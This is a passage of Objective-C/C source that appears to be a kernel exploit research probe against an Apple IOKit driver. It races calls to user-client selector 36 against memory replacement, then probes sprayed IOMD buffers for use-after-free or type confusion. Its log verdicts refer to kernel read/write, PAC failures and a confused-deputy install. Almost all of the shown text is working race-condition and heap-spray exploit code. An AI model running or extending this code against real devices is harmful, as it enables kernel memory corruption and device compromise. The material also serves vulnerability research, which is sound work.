    uint32_t conn = dconn ? dconn : rconn;
    p011_dump_res("p017 [0]", ref);
    p011_log("p017 [0] id=%u conn=%u", rid, conn);
    if (!conn || !rid) { p011_log("p017 STOP conn/id"); return p011_finish(); }

    uint64_t cin[3] = { rid, 0, 0x1000 };
    uint64_t cout = 0;
    uint32_t nout = 1;
    p011_log("p017 [calib] sel36 {id=%u,0,0x1000} — if last line, died on first sel36", rid);
    fcntl(p011_fd, F_FULLFSYNC);
    kern_return_t ckr = iocall(conn, 36, cin, 3, NULL, 0, &cout, &nout, NULL, NULL);
    p011_log("p017 [calib] sel36 kr=0x%08x %s sout=0x%llx nout=%u",
             (unsigned)ckr, p011_kr(ckr), (unsigned long long)cout, nout);
    fcntl(p011_fd, F_FULLFSYNC);
    if (ckr != 0) {
        p011_log("p017 STOP calib not SUCCESS");
        return p011_finish();
    }

    p014_kh kh[P014_HIST];
    p014_oh oh[P014_HIST];
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    atomic_int stop = 0;
    atomic_ullong ia = 0, ib = 0, sok = 0, sfail = 0;
    atomic_ullong det_fail = 0, rep_ok = 0, rep_fail = 0;
    uint32_t live_ids[P017_RING];
    memset(live_ids, 0, sizeof(live_ids));
    atomic_int live_n = 0;

    p017_arg a, b;
    memset(&a, 0, sizeof(a));
    a.ref = ref;
    a.detach = g_detach;
    a.repl = g_repl;
    a.iocall = iocall;
    a.conn = conn;
    a.id = rid;
    a.sel_len = 0x1000;
    a.repl_page = (void *)pr;
    a.repl_len = Ls;
    a.spray_dev = g_dev;
    a.getType = getType;
    a.stop = &stop;
    a.itersA = &ia;
    a.itersB = &ib;
    a.spray_ok = &sok;
    a.spray_fail = &sfail;
    a.kh = kh;
    a.oh = oh;
    a.det_fail = &det_fail;
    a.rep_fail = &rep_fail;
    a.rep_ok = &rep_ok;
    a.live_ids = live_ids;
    a.live_n = &live_n;
    b = a;

    p011_log("p017 [phase1] START %ds A=sel36(tag1) B=replace+alloc(tag2)", P017_SEC);
    fcntl(p011_fd, F_FULLFSYNC);
    pthread_t ta, tb;
    if (pthread_create(&ta, NULL, p017_thr_a, &a) != 0 ||
        pthread_create(&tb, NULL, p017_thr_b, &b) != 0) {
        atomic_store(&stop, 1);
        p011_log("p017 STOP pthread");
        return p011_finish();
    }
    NSDate *t0 = [NSDate date];
    while (-[t0 timeIntervalSinceNow] < (NSTimeInterval)P017_SEC) {
        sleep(5);
        int nsout = 0;
        for (int i = 0; i < P014_HIST && oh[i].n; i++) nsout++;
        p011_log("p017 [phase1] t=%.0fs itersA=%llu itersB=%llu spray_ok=%llu spray_fail=%llu det_fail=%llu rep_ok=%llu distinct_sout_slots=%d",
                 -[t0 timeIntervalSinceNow],
                 (unsigned long long)atomic_load(&ia),
                 (unsigned long long)atomic_load(&ib),
                 (unsigned long long)atomic_load(&sok),
                 (unsigned long long)atomic_load(&sfail),
                 (unsigned long long)atomic_load(&det_fail),
                 (unsigned long long)atomic_load(&rep_ok),
                 nsout);
        fcntl(p011_fd, F_FULLFSYNC);
    }
    atomic_store(&stop, 1);
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    p014_dump_hist("p017-phase1", atomic_load(&ia), atomic_load(&ib),
                   kh, oh, atomic_load(&det_fail), atomic_load(&rep_ok),
                   atomic_load(&rep_fail), cout);
    p011_log("p017 [phase1] spray_ok=%llu spray_fail=%llu (0x400 type0x80)",
             (unsigned long long)atomic_load(&sok),
             (unsigned long long)atomic_load(&sfail));
    fcntl(p011_fd, F_FULLFSYNC);

    int nlive = atomic_load(&live_n);
    p011_log("p017 [phase2] sel36 {id,0,8} on %d live spray buffers", nlive);
    fcntl(p011_fd, F_FULLFSYNC);
    int died = 0;
    for (int i = 0; i < nlive; i++) {
        uint64_t sin[3] = { live_ids[i], 0, 8 };
        uint64_t sout = 0;
        uint32_t nso = 1;
        p011_log("p017 [phase2] spray[%d] id=%u — if last line, died on this IOMD", i, live_ids[i]);
        fcntl(p011_fd, F_FULLFSYNC);
        kern_return_t skr = iocall(conn, 36, sin, 3, NULL, 0, &sout, &nso, NULL, NULL);
        p011_log("p017 [phase2] spray[%d] sel36 -> 0x%08x %s sout=0x%llx",
                 i, (unsigned)skr, p011_kr(skr), (unsigned long long)sout);
        fcntl(p011_fd, F_FULLFSYNC);
        if (skr != 0) {
            p011_log("p017 [phase2] spray[%d] id=%u NOT SUCCESS — extra-release/confusion candidate", i, live_ids[i]);
            died = 1;
            break;
        }
    }

    if (died)
        p011_log("p017 verdict: phase2 spray died. Not extra-release expected (old=0). Paste. Not KRW.");
    else if (atomic_load(&ia) == 0)
        p011_log("p017 verdict: SURVIVED but itersA=0. Probe did not run sel36.");
    else
        p011_log("p017 verdict: SURVIVED %ds itersA=%llu itersB=%llu. PAC-fail would have no verdict. Confused-deputy install possible on non-panic sel36 during replace. Not KRW.",
                 P017_SEC,
                 (unsigned long long)atomic_load(&ia),
                 (unsigned long long)atomic_load(&ib));
    fcntl(p011_fd, F_FULLFSYNC);
    vm_deallocate(mach_task_self(), pg, Ls);
    vm_deallocate(mach_task_self(), pr, Ls);
    (void)buf;
    return p011_finish();
}

@end
